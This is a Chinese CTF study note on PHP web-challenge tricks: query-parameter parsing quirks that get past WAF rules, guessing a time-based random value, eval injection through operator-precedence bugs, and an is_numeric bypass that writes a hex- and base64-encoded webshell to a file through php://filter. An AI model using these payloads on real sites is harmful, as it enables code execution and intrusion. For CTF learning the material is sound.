## **字符串解析特性**
![](.topwrite/assets/image_1732956120665.png)
原理：<https://blog.csdn.net/bin789456/article/details/120305682>
利用：<https://blog.csdn.net/qq_45521281/article/details/105871192>
如果一个IDS/IPS或WAF中有一条规则是当num参数的值是一个非数字的值则拦截。
则禁用?num=a，但用? num=a，?%20num=a效果一样。也可?[num=a。


^
传参特性
```
$_POST['a_sec']
需要传a[sec=

h_in.t传参h[in.t
```


^
## **时间相关**
```
$guess = $_GET['input'];
$target = random_int(114,114+date('s')*100000);  //114+获取的当前秒数
if(intval($guess) === intval($target)){
    good
}
```
114+获取当前秒数，必然有当前秒数是0，则就是114，所以一直?input=114等到秒数为0时即可。












^
## **运算符优先级**
and优先级低于=
```
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); //and优先级低于=。
//所以$v0的值就是$v1的判断，检查变量$v1是否是一个数字值或数字字符串。
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }   
}

要读取一个类信息，类名
var_dump(get_class_vars('ctfshow'));
?v1=1&v2=var_dump(get_class_vars&v3=);

反射获取类信息
echo new ReflectionClass('ctfshow');
?v1=1&v2=echo new ReflectionClass&v3=;
```
## **is_numeric函数特性**
```
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}

php5下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，
但题目环境没配好，是php7的is_numeric不能识别16进制，必须全数字，所以要另换方法。

当用伪协议写入时，将木马先base64编码后转成16进制就是全是数字的字符串！
$a='<?=`cat *`;';
$b=base64_encode($a);//$a=PD89YGNhdCAqYDs=
$c=bin2hex('PD89YGNhdCAqYDs');
得到5044383959474e6864434171594473

?v2=115044383959474e68644341715944&v3=php://filter/write=convert.base64-decode/resource=1.php
POST:v1=hex2bin
```